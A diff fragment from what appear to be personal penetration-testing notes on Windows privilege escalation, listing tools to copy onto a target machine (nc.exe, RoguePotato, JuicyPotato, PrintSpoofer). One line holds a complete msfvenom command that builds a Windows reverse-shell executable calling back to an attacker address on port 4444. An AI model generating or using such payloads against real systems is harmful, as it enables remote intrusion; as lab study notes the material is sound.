@@ -38,7 +38,7 @@ From the above scenarion there many ways you can try to exploit this but actuall
 
 ## first thing were gonna need is transfering the following binaries into our target machine 
 1. nc.exe (specific for windows) [[nc.exe]]
-2. RoguePotato.exe [[RoguePotato.md]]
+2. RoguePotato.exe[[RoguePotato.md]]
 3. JuicyPotato
 4. payload with msfvenom specific for windows(msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.29 LPORT=4444 -a x64 --platform Windows -f exe -o shell.exe)
 5. PrintSpoofer
